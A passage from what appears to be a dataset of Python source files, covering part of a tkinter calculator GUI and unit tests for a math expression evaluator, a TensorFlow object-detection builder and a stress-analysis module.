calcTxt.config(text=lib.textCalc)\n                return\n            if lib.textCalc == '' :\n                return\n            lib.textCalc = list(lib.textCalc)\n            lib.textCalc.pop()\n            lib.textCalc = ''.join(lib.textCalc)\n            calcTxt.config(text=lib.textCalc)\n            return\n        if lib.textCalc == \"Error, result too long\" and str(txt) != '=' :\n            lib.textCalc = str(txt)\n            calcTxt.config(text=lib.textCalc)\n            return\n        if lib.textCalc == 'Error' and str(txt) != '=' :\n            lib.textCalc = str(txt)\n            calcTxt.config(text=lib.textCalc)\n            return\n        if txt == '=' :\n            lib.textCalc = str(round(eval(lib.textCalc),3))\n            if len(lib.textCalc) >= 21 :\n                lib.textCalc = \"Error, result too long\"\n            calcTxt.config(text=lib.textCalc)\n            return\n        if len(lib.textCalc) >= 21 :\n            return\n        lib.textCalc += str(txt)\n        calcTxt.config(text=lib.textCalc)\n    except:\n        lib.textCalc = \"Error\"\n        calcTxt.config(text=lib.textCalc)\n\ndef ChangeTheme(*args):\n    lib.buttonColor = colors[option.get()][0]\n    lib.fenetreColor = colors[option.get()][1]\n    lib.textColor = colors[option.get()][2]\n    fenetre.configure(bg=lib.fenetreColor)\n    calcTxt.config(bg=lib.fenetreColor,fg=lib.textColor)\n    for key in h.keys():\n        h[key].config(highlightbackground=lib.buttonColor,\n                   bg=lib.buttonColor,\n                   fg=lib.textColor)\n\nfenetre = tkinter.Tk()\nfenetre.configure(bg=lib.fenetreColor)\nfenetre.title(\"Calculatrice\")\n\nfontCalc = tkfont.Font(size=12,weight=\"bold\")\ncalcTxt = tkinter.Label(fenetre, text=lib.textCalc,height=3,font=fontCalc,bg=lib.fenetreColor,fg=lib.textColor)\ncalcTxt.grid(column=0,row=0,columnspan=4,pady=5)\n\nhaut = 2; larg = 4\nh = { 'b0':[0,1,5], 'b1':[1,0,4], 'b2':[2,1,4], 'b3':[3,2,4], 'b4':[4,0,3], 'b5':[5,1,3]\n     ,'b6':[6,2,3], 'b7':[7,0,2], 'b8':[8,1,2], 'b9':[9,2,2],'bVirg':['.',0,5]\n     ,'bEgal':['=',3,5], 'bPlus':['+',3,4],'bMoins':['-',3,3],'bFoix':['*',3,2]\n     ,'bDiv':['/',3,1], 'bSUPPR':['SUPPR',2,1], 'bPatG':['(',0,1], 'bParD':[')',1,1]}\n\nfor key,value in h.items():\n    h[key] = tkinter.Button(fenetre,text=str(value[0]),\n                            command=partial(Actualiser,value[0]),\n                            height = haut,\n                            width = larg*3 if value[0] == 0 else larg,\n                            relief=\"groove\",\n                            highlightbackground=lib.buttonColor,\n                            bg=lib.buttonColor,\n                            fg=lib.textColor)\n    h[key].grid(column=value[1],\n                row=value[2],\n                columnspan=2 if value[0] == 0 else 1)\n\noption = tkinter.StringVar()\nlistTheme = ('light','dark')\ntheme = ttk.OptionMenu(fenetre,option,listTheme[0],*listTheme,command=ChangeTheme)\ntheme.grid(column=0,\n           row=6,\n           columnspan=4)\n\ninit = True\n\nfenetre.mainloop()", "342": "\"\"\"\nUnit tests for calc.py\n\"\"\"\n\nimport unittest\nimport numpy\nimport calc\nfrom pyparsing import ParseException\n\n# numpy's default behavior when it evaluates a function outside its domain\n# is to raise a warning (not an exception) which is then printed to STDOUT.\n# To prevent this from polluting the output of the tests, configure numpy to\n# ignore it instead.\n# See http://docs.scipy.org/doc/numpy/reference/generated/numpy.seterr.html\nnumpy.seterr(all='ignore')  # Also: 'ignore', 'warn' (default), 'raise'\n\n\nclass EvaluatorTest(unittest.TestCase):\n    \"\"\"\n    Run tests for calc.evaluator\n    Go through all functionalities as specifically as possible--\n    work from number input to functions and complex expressions\n    Also test custom variable substitutions (i.e.\n      `evaluator({'x':3.0}, {}, '3*x')`\n    gives 9.0) and more.\n    \"\"\"\n\n    def test_number_input(self):\n        \"\"\"\n        Test different kinds of float inputs\n\n        See also\n          test_trailing_period (slightly different)\n          test_exponential_answer\n          test_si_suffix\n        \"\"\"\n        easy_eval = lambda x: calc.evaluator({}, {}, x)\n\n        self.assertEqual(easy_eval(\"13\"), 13)\n        self.assertEqual(easy_eval(\"3.14\"), 3.14)\n        self.assertEqual(easy_eval(\".618033989\"), 0.618033989)\n\n        self.assertEqual(easy_eval(\"-13\"), -13)\n        self.assertEqual(easy_eval(\"-3.14\"), -3.14)\n        self.assertEqual(easy_eval(\"-.618033989\"), -0.618033989)\n\n    def test_period(self):\n        \"\"\"\n        The string '.' should not evaluate to anything.\n        \"\"\"\n        with self.assertRaises(ParseException):\n            calc.evaluator({}, {}, '.')\n        with self.assertRaises(ParseException):\n            calc.evaluator({}, {}, '1+.')\n\n    def test_trailing_period(self):\n        \"\"\"\n        Test that things like '4.' will be 4 and not throw an error\n        \"\"\"\n        self.assertEqual(4.0, calc.evaluator({}, {}, '4.'))\n\n    def test_exponential_answer(self):\n        \"\"\"\n        Test for correct interpretation of scientific notation\n        \"\"\"\n        answer = 50\n        correct_responses = [\n            \"50\", \"50.0\", \"5e1\", \"5e+1\",\n            \"50e0\", \"50.0e0\", \"500e-1\"\n        ]\n        incorrect_responses = [\"\", \"3.9\", \"4.1\", \"0\", \"5.01e1\"]\n\n        for input_str in correct_responses:\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Expected '{0}' to equal {1}\".format(\n                input_str, answer\n            )\n            self.assertEqual(answer, result, msg=fail_msg)\n\n        for input_str in incorrect_responses:\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Expected '{0}' to not equal {1}\".format(\n                input_str, answer\n            )\n            self.assertNotEqual(answer, result, msg=fail_msg)\n\n    def test_si_suffix(self):\n        \"\"\"\n        Test calc.py's unique functionality of interpreting si 'suffixes'.\n\n        For instance 'k' stand for 'kilo-' so '1k' should be 1,000\n        \"\"\"\n        test_mapping = [\n            ('4.2%', 0.042), ('2.25k', 2250), ('8.3M', 8300000),\n            ('9.9G', 9.9e9), ('1.2T', 1.2e12), ('7.4c', 0.074),\n            ('5.4m', 0.0054), ('8.7u', 0.0000087),\n            ('5.6n', 5.6e-9), ('4.2p', 4.2e-12)\n        ]\n\n        for (expr, answer) in test_mapping:\n            tolerance = answer * 1e-6  # Make rel. tolerance, because of floats\n            fail_msg = \"Failure in testing suffix '{0}': '{1}' was not {2}\"\n            fail_msg = fail_msg.format(expr[-1], expr, answer)\n            self.assertAlmostEqual(\n                calc.evaluator({}, {}, expr), answer,\n                delta=tolerance, msg=fail_msg\n            )\n\n    def test_operator_sanity(self):\n        \"\"\"\n        Test for simple things like '5+2' and '5/2'\n        \"\"\"\n        var1 = 5.0\n        var2 = 2.0\n        operators = [('+', 7), ('-', 3), ('*', 10), ('/', 2.5), ('^', 25)]\n\n        for (operator, answer) in operators:\n            input_str = \"{0} {1} {2}\".format(var1, operator, var2)\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Failed on operator '{0}': '{1}' was not {2}\".format(\n                operator, input_str, answer\n            )\n            self.assertEqual(answer, result, msg=fail_msg)\n\n    def test_raises_zero_division_err(self):\n        \"\"\"\n        Ensure division by zero gives an error\n        \"\"\"\n        with self.assertRaises(ZeroDivisionError):\n            calc.evaluator({}, {}, '1/0')\n        with self.assertRaises(ZeroDivisionError):\n            calc.evaluator({}, {}, '1/0.0')\n        with self.assertRaises(ZeroDivisionError):\n            calc.evaluator({'x': 0.0}, {}, '1/x')\n\n    def test_parallel_resistors(self):\n        \"\"\"\n        Test the parallel resistor operator ||\n\n        The formula is given by\n            a || b || c ...\n            = 1 / (1/a + 1/b + 1/c + ...)\n        It is the resistance of a parallel circuit of resistors with resistance\n        a, b, c, etc&. See if this evaulates correctly.\n        \"\"\"\n        self.assertEqual(calc.evaluator({}, {}, '1||1'), 0.5)\n        self.assertEqual(calc.evaluator({}, {}, '1||1||2'), 0.4)\n        self.assertEqual(calc.evaluator({}, {}, \"j||1\"), 0.5 + 0.5j)\n\n    def test_parallel_resistors_with_zero(self):\n        \"\"\"\n        Check the behavior of the || operator with 0\n        \"\"\"\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, '0||1')))\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, '0.0||1')))\n        self.assertTrue(numpy.isnan(calc.evaluator({'x': 0.0}, {}, 'x||1')))\n\n    def assert_function_values(self, fname, ins, outs, tolerance=1e-3):\n        \"\"\"\n        Helper function to test many values at once\n\n        Test the accuracy of evaluator's use of the function given by fname\n        Specifically, the equality of `fname(ins[i])` against outs[i].\n        This is used later to test a whole bunch of f(x) = y at a time\n        \"\"\"\n\n        for (arg, val) in zip(ins, outs):\n            input_str = \"{0}({1})\".format(fname, arg)\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Failed on function {0}: '{1}' was not {2}\".format(\n                fname, input_str, val\n            )\n            self.assertAlmostEqual(val, result, delta=tolerance, msg=fail_msg)\n\n    def test_trig_functions(self):\n        \"\"\"\n        Test the trig functions provided in calc.py\n\n        which are: sin, cos, tan, arccos, arcsin, arctan\n        \"\"\"\n\n        angles = ['-pi/4', '0', 'pi/6', 'pi/5', '5*pi/4', '9*pi/4', '1 + j']\n        sin_values = [-0.707, 0, 0.5, 0.588, -0.707, 0.707, 1.298 + 0.635j]\n        cos_values = [0.707, 1, 0.866, 0.809, -0.707, 0.707, 0.834 - 0.989j]\n        tan_values = [-1, 0, 0.577, 0.727, 1, 1, 0.272 + 1.084j]\n        # Cannot test tan(pi/2) b/c pi/2 is a float and not precise...\n\n        self.assert_function_values('sin', angles, sin_values)\n        self.assert_function_values('cos', angles, cos_values)\n        self.assert_function_values('tan', angles, tan_values)\n\n        # Include those where the real part is between -pi/2 and pi/2\n        arcsin_inputs = ['-0.707', '0', '0.5', '0.588', '1.298 + 0.635*j']\n        arcsin_angles = [-0.785, 0, 0.524, 0.629, 1 + 1j]\n        self.assert_function_values('arcsin', arcsin_inputs, arcsin_angles)\n        # Rather than a complex number, numpy.arcsin gives nan\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, 'arcsin(-1.1)')))\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, 'arcsin(1.1)')))\n\n        # Include those where the real part is between 0 and pi\n        arccos_inputs = ['1', '0.866', '0.809', '0.834-0.989*j']\n        arccos_angles = [0, 0.524, 0.628, 1 + 1j]\n        self.assert_function_values('arccos', arccos_inputs, arccos_angles)\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, 'arccos(-1.1)')))\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, 'arccos(1.1)')))\n\n        # Has the same range as arcsin\n        arctan_inputs = ['-1', '0', '0.577', '0.727', '0.272 + 1.084*j']\n        arctan_angles = arcsin_angles\n        self.assert_function_values('arctan', arctan_inputs, arctan_angles)\n\n    def test_reciprocal_trig_functions(self):\n        \"\"\"\n        Test the reciprocal trig functions provided in calc.py\n\n        which are: sec, csc, cot, arcsec, arccsc, arccot\n        \"\"\"\n        angles = ['-pi/4', 'pi/6', 'pi/5', '5*pi/4', '9*pi/4', '1 + j']\n        sec_values = [1.414, 1.155, 1.236, -1.414, 1.414, 0.498 + 0.591j]\n        csc_values = [-1.414, 2, 1.701, -1.414, 1.414, 0.622 - 0.304j]\n        cot_values = [-1, 1.732, 1.376, 1, 1, 0.218 - 0.868j]\n\n        self.assert_function_values('sec', angles, sec_values)\n        self.assert_function_values('csc', angles, csc_values)\n        self.assert_function_values('cot', angles, cot_values)\n\n        arcsec_inputs = ['1.1547', '1.2361', '2', '-2', '-1.4142', '0.4983+0.5911*j']\n        arcsec_angles = [0.524, 0.628, 1.047, 2.094, 2.356, 1 + 1j]\n        self.assert_function_values('arcsec', arcsec_inputs, arcsec_angles)\n\n        arccsc_inputs = ['-1.1547', '-1.4142', '2', '1.7013', '1.1547', '0.6215-0.3039*j']\n        arccsc_angles = [-1.047, -0.785, 0.524, 0.628, 1.047, 1 + 1j]\n        self.assert_function_values('arccsc', arccsc_inputs, arccsc_angles)\n\n        # Has the same range as arccsc\n        arccot_inputs = ['-0.5774', '-1', '1.7321', '1.3764', '0.5774', '(0.2176-0.868*j)']\n        arccot_angles = arccsc_angles\n        self.assert_function_values('arccot', arccot_inputs, arccot_angles)\n\n    def test_hyperbolic_functions(self):\n        \"\"\"\n        Test the hyperbolic functions\n\n        which are: sinh, cosh, tanh, sech, csch, coth\n        \"\"\"\n        inputs = ['0', '0.5', '1', '2', '1+j']\n        neg_inputs = ['0', '-0.5', '-1', '-2', '-1-j']\n        negate = lambda x: [-k for k in x]\n\n        # sinh is odd\n        sinh_vals = [0, 0.521, 1.175, 3.627, 0.635 + 1.298j]\n        self.assert_function_values('sinh', inputs, sinh_vals)\n        self.assert_function_values('sinh', neg_inputs, negate(sinh_vals))\n\n        # cosh is even - do not negate\n        cosh_vals = [1, 1.128, 1.543, 3.762, 0.834 + 0.989j]\n        self.assert_function_values('cosh', inputs, cosh_vals)\n        self.assert_function_values('cosh', neg_inputs, cosh_vals)\n\n        # tanh is odd\n        tanh_vals = [0, 0.462, 0.762, 0.964, 1.084 + 0.272j]\n        self.assert_function_values('tanh', inputs, tanh_vals)\n        self.assert_function_values('tanh', neg_inputs, negate(tanh_vals))\n\n        # sech is even - do not negate\n        sech_vals = [1, 0.887, 0.648, 0.266, 0.498 - 0.591j]\n        self.assert_function_values('sech', inputs, sech_vals)\n        self.assert_function_values('sech', neg_inputs, sech_vals)\n\n        # the following functions do not have 0 in their domain\n        inputs = inputs[1:]\n        neg_inputs = neg_inputs[1:]\n\n        # csch is odd\n        csch_vals = [1.919, 0.851, 0.276, 0.304 - 0.622j]\n        self.assert_function_values('csch', inputs, csch_vals)\n        self.assert_function_values('csch', neg_inputs, negate(csch_vals))\n\n        # coth is odd\n        coth_vals = [2.164, 1.313, 1.037, 0.868 - 0.218j]\n        self.assert_function_values('coth', inputs, coth_vals)\n        self.assert_function_values('coth', neg_inputs, negate(coth_vals))\n\n    def test_hyperbolic_inverses(self):\n        \"\"\"\n        Test the inverse hyperbolic functions\n\n        which are of the form arc[X]h\n        \"\"\"\n        results = [0, 0.5, 1, 2, 1 + 1j]\n\n        sinh_vals = ['0', '0.5211', '1.1752', '3.6269', '0.635+1.2985*j']\n        self.assert_function_values('arcsinh', sinh_vals, results)\n\n        cosh_vals = ['1', '1.1276', '1.5431', '3.7622', '0.8337+0.9889*j']\n        self.assert_function_values('arccosh', cosh_vals, results)\n\n        tanh_vals = ['0', '0.4621', '0.7616', '0.964', '1.0839+0.2718*j']\n        self.assert_function_values('arctanh', tanh_vals, results)\n\n        sech_vals = ['1.0', '0.8868', '0.6481', '0.2658', '0.4983-0.5911*j']\n        self.assert_function_values('arcsech', sech_vals, results)\n\n        results = results[1:]\n        csch_vals = ['1.919', '0.8509', '0.2757', '0.3039-0.6215*j']\n        self.assert_function_values('arccsch', csch_vals, results)\n\n        coth_vals = ['2.164', '1.313', '1.0373', '0.868-0.2176*j']\n        self.assert_function_values('arccoth', coth_vals, results)\n\n    def test_other_functions(self):\n        \"\"\"\n        Test the non-trig functions provided in calc.py\n\n        Specifically:\n          sqrt, log10, log2, ln, abs,\n          fact, factorial\n        \"\"\"\n\n        # Test sqrt\n        self.assert_function_values(\n            'sqrt',\n            [0, 1, 2, 1024],  # -1\n            [0, 1, 1.414, 32]  # 1j\n        )\n        # sqrt(-1) is NAN not j (!!).\n\n        # Test logs\n        self.assert_function_values(\n            'log10',\n            [0.1, 1, 3.162, 1000000, '1+j'],\n            [-1, 0, 0.5, 6, 0.151 + 0.341j]\n        )\n        self.assert_function_values(\n            'log2',\n            [0.5, 1, 1.414, 1024, '1+j'],\n            [-1, 0, 0.5, 10, 0.5 + 1.133j]\n        )\n        self.assert_function_values(\n            'ln',\n            [0.368, 1, 1.649, 2.718, 42, '1+j'],\n            [-1, 0, 0.5, 1, 3.738, 0.347 + 0.785j]\n        )\n\n        # Test abs\n        self.assert_function_values('abs', [-1, 0, 1, 'j'], [1, 0, 1, 1])\n\n        # Test factorial\n        fact_inputs = [0, 1, 3, 7]\n        fact_values = [1, 1, 6, 5040]\n        self.assert_function_values('fact', fact_inputs, fact_values)\n        self.assert_function_values('factorial', fact_inputs, fact_values)\n\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"fact(-1)\")\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"fact(0.5)\")\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"factorial(-1)\")\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"factorial(0.5)\")\n\n    def test_constants(self):\n        \"\"\"\n        Test the default constants provided in calc.py\n\n        which are: j (complex number), e, pi, k, c, T, q\n        \"\"\"\n\n        # Of the form ('expr', python value, tolerance (or None for exact))\n        default_variables = [\n            ('i', 1j, None),\n            ('j', 1j, None),\n            ('e', 2.7183, 1e-4),\n            ('pi', 3.1416, 1e-4),\n            ('k', 1.3806488e-23, 1e-26),  # Boltzmann constant (Joules/Kelvin)\n            ('c', 2.998e8, 1e5),  # Light Speed in (m/s)\n            ('T', 298.15, 0.01),  # Typical room temperature (Kelvin)\n            ('q', 1.602176565e-19, 1e-22)  # Fund. Charge (Coulombs)\n        ]\n        for (variable, value, tolerance) in default_variables:\n            fail_msg = \"Failed on constant '{0}', not within bounds\".format(\n                variable\n            )\n            result = calc.evaluator({}, {}, variable)\n            if tolerance is None:\n                self.assertEqual(value, result, msg=fail_msg)\n            else:\n                self.assertAlmostEqual(\n                    value, result,\n                    delta=tolerance, msg=fail_msg\n                )\n\n    def test_complex_expression(self):\n        \"\"\"\n        Calculate combinations of operators and default functions\n        \"\"\"\n\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"(2^2+1.0)/sqrt(5e0)*5-1\"),\n            10.180,\n            delta=1e-3\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"1+1/(1+1/(1+1/(1+1)))\"),\n            1.6,\n            delta=1e-3\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"10||sin(7+5)\"),\n            -0.567, delta=0.01\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"sin(e)\"),\n            0.41, delta=0.01\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"k*T/q\"),\n            0.025, delta=1e-3\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"e^(j*pi)\"),\n            -1, delta=1e-5\n        )\n\n    def test_explicit_sci_notation(self):\n        \"\"\"\n        Expressions like 1.6*10^-3 (not 1.6e-3) it should evaluate.\n        \"\"\"\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^-3\"),\n            -0.0016\n        )\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^(-3)\"),\n            -0.0016\n        )\n\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^3\"),\n            -1600\n        )\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^(3)\"),\n            -1600\n        )\n\n    def test_simple_vars(self):\n        \"\"\"\n        Substitution of variables into simple equations\n        \"\"\"\n        variables = {'x': 9.72, 'y': 7.91, 'loooooong': 6.4}\n\n        # Should not change value of constant\n        # even with different numbers of variables...\n        self.assertEqual(calc.evaluator({'x': 9.72}, {}, '13'), 13)\n        self.assertEqual(calc.evaluator({'x': 9.72, 'y': 7.91}, {}, '13'), 13)\n        self.assertEqual(calc.evaluator(variables, {}, '13'), 13)\n\n        # Easy evaluation\n        self.assertEqual(calc.evaluator(variables, {}, 'x'), 9.72)\n        self.assertEqual(calc.evaluator(variables, {}, 'y'), 7.91)\n        self.assertEqual(calc.evaluator(variables, {}, 'loooooong'), 6.4)\n\n        # Test a simple equation\n        self.assertAlmostEqual(\n            calc.evaluator(variables, {}, '3*x-y'),\n            21.25, delta=0.01  # = 3 * 9.72 - 7.91\n        )\n        self.assertAlmostEqual(\n            calc.evaluator(variables, {}, 'x*y'),\n            76.89, delta=0.01\n        )\n\n        self.assertEqual(calc.evaluator({'x': 9.72, 'y': 7.91}, {}, \"13\"), 13)\n        self.assertEqual(calc.evaluator(variables, {}, \"13\"), 13)\n        self.assertEqual(\n            calc.evaluator(\n                {'a': 2.2997471478310274, 'k': 9, 'm': 8, 'x': 0.6600949841121},\n                {}, \"5\"\n            ),\n            5\n        )\n\n    def test_variable_case_sensitivity(self):\n        \"\"\"\n        Test the case sensitivity flag and corresponding behavior\n        \"\"\"\n        self.assertEqual(\n            calc.evaluator({'R1': 2.0, 'R3': 4.0}, {}, \"r1*r3\"),\n            8.0\n        )\n\n        variables = {'t': 1.0}\n        self.assertEqual(calc.evaluator(variables, {}, \"t\"), 1.0)\n        self.assertEqual(calc.evaluator(variables, {}, \"T\"), 1.0)\n        self.assertEqual(\n            calc.evaluator(variables, {}, \"t\", case_sensitive=True),\n            1.0\n        )\n        # Recall 'T' is a default constant, with value 298.15\n        self.assertAlmostEqual(\n            calc.evaluator(variables, {}, \"T\", case_sensitive=True),\n            298, delta=0.2\n        )\n\n    def test_simple_funcs(self):\n        \"\"\"\n        Subsitution of custom functions\n        \"\"\"\n        variables = {'x': 4.712}\n        functions = {'id': lambda x: x}\n        self.assertEqual(calc.evaluator({}, functions, 'id(2.81)'), 2.81)\n        self.assertEqual(calc.evaluator({}, functions, 'id(2.81)'), 2.81)\n        self.assertEqual(calc.evaluator(variables, functions, 'id(x)'), 4.712)\n\n        functions.update({'f': numpy.sin})\n        self.assertAlmostEqual(\n            calc.evaluator(variables, functions, 'f(x)'),\n            -1, delta=1e-3\n        )\n\n    def test_function_case_insensitive(self):\n        \"\"\"\n        Test case insensitive evaluation\n\n        Normal functions with some capitals should be fine\n        \"\"\"\n        self.assertAlmostEqual(\n            -0.28,\n            calc.evaluator({}, {}, 'SiN(6)', case_sensitive=False),\n            delta=1e-3\n        )\n\n    def test_function_case_sensitive(self):\n        \"\"\"\n        Test case sensitive evaluation\n\n        Incorrectly capitilized should fail\n        Also, it should pick the correct version of a function.\n        \"\"\"\n        with self.assertRaisesRegexp(calc.UndefinedVariable, 'SiN'):\n            calc.evaluator({}, {}, 'SiN(6)', case_sensitive=True)\n\n        # With case sensitive turned on, it should pick the right function\n        functions = {'f': lambda x: x, 'F': lambda x: x + 1}\n        self.assertEqual(\n            6, calc.evaluator({}, functions, 'f(6)', case_sensitive=True)\n        )\n        self.assertEqual(\n            7, calc.evaluator({}, functions, 'F(6)', case_sensitive=True)\n        )\n\n    def test_undefined_vars(self):\n        \"\"\"\n        Check to see if the evaluator catches undefined variables\n        \"\"\"\n        variables = {'R1': 2.0, 'R3': 4.0}\n\n        with self.assertRaisesRegexp(calc.UndefinedVariable, 'QWSEKO'):\n            calc.evaluator({}, {}, \"5+7*QWSEKO\")\n        with self.assertRaisesRegexp(calc.UndefinedVariable, 'r2'):\n            calc.evaluator({'r1': 5}, {}, \"r1+r2\")\n        with self.assertRaisesRegexp(calc.UndefinedVariable, 'r1 r3'):\n            calc.evaluator(variables, {}, \"r1*r3\", case_sensitive=True)\n", "343": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "344": "from math import pi\nimport unittest\nfrom mock import Mock, MagicMock, patch\nfrom anSol import calcK, calcR, calcQ, calcStresses, calcK1, calcK2, calcK3, calcAnSolWrapper\n\nmodulePrefix = 'anSol.'\n\n\nclass TestCalcK(unittest.TestCase):\n\n    def test_calcK_with_invalid_axes_values(self):\n        axes = [(-10, -5), (-1, -2), (-1, 2), (0, -2), (0, 2), (0, 0), (2, 3)]\n        for a, b in axes:\n            self.assertRaises(AssertionError, calcK, a, b)\n\n    def test_calcK_with_valid_axes_values(self):\n        axes = [(2, 1), (1, 1), (2, 2), (10, 1)]\n        kVals = [0.866025403, 0, 0, 0.994987437]\n        for (a, b), k in zip(axes, kVals):\n            self.assertAlmostEqual(k, calcK(a, b))\n\n\nclass TestCalcR(unittest.TestCase):\n\n    def test_calcR_with_invalid_v_and_valid_k(self):\n        k = 0.5\n        for v in [-2, -1, -0.5, 0, 0.51, 1]:\n            self.assertRaises(AssertionError, calcR, k, v)\n\n    def test_calcR_with_valid_v_and_invalid_k(self):\n        v = 0.3\n        for k in [-1, -0.1, 1, 2]:\n            self.assertRaises(AssertionError, calcR, k, v)\n\n    def test_calcR_with_valid_v_and_nonzero_k(self):\n        kv = [(0.1, 0.5), (0.5, 0.5), (0.9, 0.5),\n              (0.1, 0.3), (0.5, 0.3), (0.9, 0.3)]\n        res = [0.20795543698, 0.6990718462014841, 1.3789606608181639,\n               0.28591552229, 0.71503219085390219, 1.1402245888836]\n        for (k, v), r in zip(kv, res):\n            self.assertAlmostEqual(r, calcR(k, v))\n\n    def test_calcR_with_valid_v_and_zero_k(self):\n        v = 0.3\n        k = 0.0\n        exp = 2.0 / (pi * (1 - v))\n        self.assertAlmostEqual(exp, calcR(k, v))\n\n\nclass TestCalcQ(unittest.TestCase):\n\n    def test_calcQ_with_invalid_v_and_valid_k(self):\n        k = 0.5\n        for v in [-2, -1, -0.5, 0, 0.51, 1]:\n            self.assertRaises(AssertionError, calcQ, k, v)\n\n    def test_calcQ_with_valid_v_and_invalid_k(self):\n        v = 0.3\n        for k in [-1, -0.1, 1, 2]:\n            self.assertRaises(AssertionError, calcQ, k, v)\n\n    def test_calcQ_with_valid_v_and_nonzero_k(self):\n        kv = [(0.1, 0.5), (0.5, 0.5), (0.9, 0.5),\n              (0.1, 0.3), (0.5, 0.3), (0.9, 0.3)]\n        res = [-0.3979963117, 1.67926764853912, 1.07298641382068,\n               -1.1170081642, 1.11413640688092, 0.998904358791297]\n        for (k, v), r in zip(kv, res):\n            self.assertAlmostEqual(r, calcQ(k, v))\n\n    def test_calcQ_with_valid_v_and_zero_k(self):\n        v = 0.3\n        k = 0.0\n        exp = 2.0 / pi\n        self.assertAlmostEqual(exp, calcQ(k, v))\n\n\nclass TestCalcStresses(unittest.TestCase):\n\n    def test_calcStresses_with_gamma_less_or_equal_to_90_degrees(self):\n        s_a = [(100, 0), (100, 30), (100, 60), (100, 90)]\n        res = [(100, 0), (75, 43.301270189), (25, 43.301270189), (0, 0)]\n        for (stress, gamma), (exp_sigma, exp_tao) in zip(s_a, res):\n            sigma, tao = calcStresses(stress, gamma)\n            self.assertAlmostEqual(exp_sigma, sigma)\n            self.assertAlmostEqual(exp_tao, tao)\n\n    def test_calcStresses_with_gamma_larger_than_or_equal_to_360_degrees(self):\n        s_a = [(100, 360), (100, 390), (100, 420), (100, 450)]\n        res = [(100, 0), (75, 43.301270189), (25, 43.301270189), (0, 0)]\n        for (stress, gamma), (exp_sigma, exp_tao) in zip(s_a, res):\n            sigma, tao = calcStresses(stress, gamma)\n            self.assertAlmostEqual(exp_sigma, sigma)\n            self.assertAlmostEqual(exp_tao, tao)\n\n    def test_calcStress_with_gamma_larger_than_90_or_less_than_0(self):\n        s_a = [(100, -10), (100, 130), (100, 200), (100, 350)]\n        for sigma, gamma in s_a:\n            self.assertRaises(AssertionError, calcStresses, sigma, gamma)\n\n\nclass TestCalcK1(unittest.TestCase):\n\n    def test_calcK1_with_a20_b10_sigma100(self):\n        a, b = 20, 10\n        betas = [0, 60, 90,\n                 120, 180, 240,\n                 270, 300, 360]\n        sigma = 100\n        expected = [247.6864593064, 345.116280255875, 350.28154996732,\n                    345.116280255875, 247.6864593064, 345.11628025587532,\n                    350.28154996732, 345.116280255875, 247.6864593064754]\n        for beta, k1 in zip(betas, expected):\n            self.assertAlmostEqual(k1, calcK1(a, b, beta, sigma))\n\n    def test_calcK1_with_a20_b20_sigma100(self):\n        a, b = 20, 20\n        sigma = 100\n        betas = [0, 60, 90, 180, 240, 300, 360, 400]\n        